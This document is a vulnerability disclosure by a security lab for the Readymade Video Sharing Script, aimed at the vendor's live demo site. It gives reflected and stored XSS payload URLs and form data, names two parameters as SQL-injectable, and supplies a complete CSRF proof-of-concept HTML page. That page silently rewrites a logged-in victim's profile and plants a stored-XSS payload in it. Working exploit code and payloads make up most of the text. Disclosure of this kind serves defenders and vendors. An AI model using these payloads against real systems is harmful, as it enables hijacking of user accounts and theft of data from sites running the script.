### Readymade Video Sharing Script- the lastest version - SQL Injection/Reflect-XSS/Stored-XSS/CSRF

#### ADLab of Venustech

Well,  when I pentest the official demo site of Readymade Video Sharing Script, I found some vulnerabilities here.


#### XSS:

##### Reflect-XSS

```
http://www.smsemailmarketing.in/demo/videosharing/search_video.php?search=123%27123%22123%3E123%3Cimg%20src=x%20onerror=prompt(/xss/)%3E123%3C123%27%22
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Readymade-Video-Sharing-Script/xss1.png)

```
http://www.smsemailmarketing.in/demo/videosharing/viewsubs.php?chnlid=123%27123%22123%3E123%3Cimg%20src=x%20onerror=prompt(/xss3/)%3E123%3C123%27%22
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Readymade-Video-Sharing-Script/xss2.png)


##### Stored-XSS 


```
http://www.smsemailmarketing.in/demo/videosharing/user-profile-edit.php
```

POST parameters:

```
------WebKitFormBoundaryb1Z9ur8DUtIWkCxA
Content-Disposition: form-data; name="fname"

lzx'"><svg/onload=alert(/xss2/)><'"
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Readymade-Video-Sharing-Script/xss3.png)


#### SQL Injection:

##### sqli1
```
http://www.smsemailmarketing.in/demo/videosharing/search_video.php?search=123
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Readymade-Video-Sharing-Script/sqli1.png)

##### sqli2

```
http://www.smsemailmarketing.in/demo/videosharing/viewsubs.php?chnlid=321
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Readymade-Video-Sharing-Script/sqli2.png)


You can see,  we can obtain the current data user or more sensitive data now!


#### CSRF

We can use csrf attack to cheat the user to change sensitive settings in the user panel, even add stored-xss content into it.

poc:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/www.smsemailmarketing.in\/demo\/videosharing\/user-profile-edit.php", true);
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundaryb1Z9ur8DUtIWkCxA");
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9");
        xhr.withCredentials = true;
        var body = "------WebKitFormBoundaryb1Z9ur8DUtIWkCxA\r\n" + 
          "Content-Disposition: form-data; name=\"fname\"\r\n" + 
          "\r\n" + 
          "lzx\'\"\x3e\x3csvg/onload=alert(/xss2/)\x3e\x3c\'\"\r\n" + 
          "------WebKitFormBoundaryb1Z9ur8DUtIWkCxA\r\n" + 
          "Content-Disposition: form-data; name=\"lname\"\r\n" + 
          "\r\n" + 
          "lzx\r\n" + 
          "------WebKitFormBoundaryb1Z9ur8DUtIWkCxA\r\n" + 
          "Content-Disposition: form-data; name=\"mobile\"\r\n" + 
          "\r\n" + 
          "1311144111\r\n" + 
          "------WebKitFormBoundaryb1Z9ur8DUtIWkCxA\r\n" + 
          "Content-Disposition: form-data; name=\"country\"\r\n" + 
          "\r\n" + 
          "17\r\n" + 
          "------WebKitFormBoundaryb1Z9ur8DUtIWkCxA\r\n" + 
          "Content-Disposition: form-data; name=\"zip_code\"\r\n" + 
          "\r\n" + 
          "123123\r\n" + 
          "------WebKitFormBoundaryb1Z9ur8DUtIWkCxA\r\n" + 
          "Content-Disposition: form-data; name=\"addr1\"\r\n" + 
          "\r\n" + 
          "test123\r\n" + 
          "------WebKitFormBoundaryb1Z9ur8DUtIWkCxA\r\n" + 
          "Content-Disposition: form-data; name=\"addr2\"\r\n" + 
          "\r\n" + 
          "test123\r\n" + 
          "------WebKitFormBoundaryb1Z9ur8DUtIWkCxA\r\n" + 
          "Content-Disposition: form-data; name=\"profile_image\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundaryb1Z9ur8DUtIWkCxA\r\n" + 
          "Content-Disposition: form-data; name=\"submit\"\r\n" + 
          "\r\n" + 
          "Save Profile\r\n" + 
          "------WebKitFormBoundaryb1Z9ur8DUtIWkCxA--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>

```

This vulnerability does not need evil attacker to login into the user panel.

